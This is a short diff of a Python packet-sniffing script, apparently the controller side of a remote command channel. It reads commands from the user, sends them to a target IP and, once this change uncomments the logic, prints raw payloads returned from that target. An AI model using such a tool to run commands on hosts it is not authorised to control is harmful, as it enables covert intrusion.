@@ -27,13 +27,12 @@ def sendCommand(cmd):
 
 def recvCommand(packet):
     global targetIP
-    packet.show()
-    # if packet.haslayer(IP):
-    #     if packet[IP].src == targetIP:
-    #         #data = parsePacket(packet)
-    #         if packet.haslayer(Raw):
-    #             cmd = packet[Raw].load
-    #             print("Result: %s " % cmd)
+    if packet.haslayer(IP):
+        if packet[IP].src == targetIP:
+            #data = parsePacket(packet)
+            if packet.haslayer(Raw):
+                cmd = packet[Raw].load
+                print("Result: %s " % cmd)
 
 def main():
     global targetIP
@@ -45,6 +44,7 @@ def main():
         cmd = input("Enter command: ")
         sendCommand(cmd)
         sniff(filter="dst port " + str(config.localPort) + " and src port " + str(config.remotePort), prn=recvCommand)
+
 
 if __name__ == '__main__':
     main()
